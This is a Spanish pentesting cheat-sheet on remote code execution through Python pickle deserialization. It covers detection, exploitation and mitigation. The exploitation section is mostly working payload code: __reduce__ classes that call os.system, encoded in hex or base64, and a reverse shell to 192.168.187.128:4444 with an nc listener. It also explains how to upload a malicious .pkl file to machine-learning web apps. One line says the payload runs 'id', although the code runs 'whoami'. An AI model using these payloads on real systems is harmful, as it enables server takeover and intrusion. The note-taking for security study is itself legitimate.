
---
Tags: #python #picke

---

## 📌 Definición

- **Pickle** es un módulo de Python que permite **serializar** y **deserializar** objetos (convertirlos a bytes y restaurarlos).
    
- Problema: al deserializar, Pickle **ejecuta código arbitrario** si el objeto contiene funciones maliciosas.
    
- Esto convierte la deserialización insegura en una **vulnerabilidad crítica de RCE**.
    

---

## ⚠️ Riesgo

- Pickle **no valida la procedencia de los datos**.
    
- Un atacante puede enviar un objeto Pickle manipulado que ejecute **código malicioso** al deserializarse.
    

---

## 🔍 Métodos de Detección

|Método|Descripción|
|---|---|
|**Revisión de código**|Buscar `pickle.load()`, `pickle.loads()`, `joblib.load()`, `dill.load()`.|
|**Fuzzing**|Probar inputs Pickle malformados y observar errores de deserialización.|
|**Pruebas dinámicas**|Inyectar objetos Pickle maliciosos en parámetros que acepten archivos o cadenas binarias.|
|**Indicadores**|Archivos `.pkl`, `.pickle`, `.joblib` o respuestas con `\x80\x04` (encabezado Pickle).|

---

## ⚔️ Métodos de Explotación

### 🛠 Payload básico malicioso

[!!!] Importante, el resultado del exploit tiene que darlo en **Hexadecimal** o **Base64** para que pueda ejecutarlo la web.

- Ejemplo **Hexadecimal**:

```python
import pickle
import os
import binascii

class Evil:
    def __reduce__(self):
        return (os.system, ("whoami",))

payload = pickle.dumps(Evil())

# Convertir a hexadecimal para enviar como string
print(binascii.hexlify(payload).decode())
```

- Al deserializar:
    

`pickle.loads(payload)`

👉 Ejecutará `id` en el sistema.

- Ejemplo en **Base64**:

```python
import pickle
import os
import base64

class Evil:
    def __reduce__(self):
        return (os.system, ("whoami",))

payload = pickle.dumps(Evil())

# Convertir a Base64
print(base64.b64encode(payload).decode())

```


---

### 📡 Reverse Shell con Pickle

[!!!] Importante, el resultado del exploit tiene que darlo en **Hexadecimal** o **Base64** para que pueda ejecutarlo la web.

- Ejemplo **Hexadecimal**:

```python
import pickle
import os
import binascii

class Evil:
    def __reduce__(self):
        cmd = "/bin/bash -c 'bash -i >& /dev/tcp/192.168.187.128/4444 0>&1'"
        return (os.system, (cmd,))

payload = pickle.dumps(Evil())
print(binascii.hexlify(payload).decode())

```

- Levantar listener en el atacante:
    

`nc -lvnp 4444`

- Cuando la víctima ejecute:
    

`pickle.load(open("payload.pkl", "rb"))`

👉 Se abrirá la reverse shell.

---

### 🚩 Explotación en WebApps

- Si una aplicación recibe archivos `.pkl` para cargar modelos (ej: **machine learning con scikit-learn/joblib**) o preferencias de usuario:
    
    - Subir un `.pkl` malicioso.
        
    - Al deserializarse en el servidor, obtendrás ejecución de comandos.
        

---

## 🛡️ Mitigación

- **Nunca** usar Pickle con datos no confiables.
    
- Usar formatos seguros como **JSON** o **YAML seguro (SafeLoader)**.
    
- Si es imprescindible usar Pickle:
    
    - Validar archivos mediante firmas digitales.
        
    - Ejecutar en entornos aislados (sandbox).
        

---

## 🏷️ Tags

#deserialization #pickle #python #RCE #pentesting